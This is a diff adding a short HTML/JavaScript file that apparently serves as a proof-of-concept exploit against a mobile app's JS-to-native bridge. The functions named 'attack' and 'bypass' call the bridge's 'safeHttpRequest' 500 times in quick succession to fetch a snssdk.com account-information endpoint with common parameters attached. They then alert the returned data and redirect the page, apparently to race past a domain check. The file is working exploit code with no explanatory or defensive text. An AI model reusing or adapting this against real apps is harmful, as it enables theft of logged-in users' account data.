@@ -1,0 +1,20 @@
+<script>
+    var Native2JSBridge={};
+    Native2JSBridge._handleMessageFromApp=function(p1){
+            var data =JSON.stringify(p1);
+            alert(data);
+    }
+    
+    function attack(){
+        JS2NativeBridge.call('safeHttpRequest','{"__callback_id":"1000","func":"safeHttpRequest","params":{"addCommonParams":true,"url":"https://is.snssdk.com/passport/account/info/v2/","method":"GET","params":{}},"JSSDK":1,"__msg_type":"call"}');
+    }
+    function bypass() {
+        for(var i =0; i < 500; i++){
+            setTimeout(attack, 10 + i);
+        }
+    }
+
+    bypass();
+    document.location.href = "https://nononoapi-test-pcs.snssdk.com/";
+  
+</script>
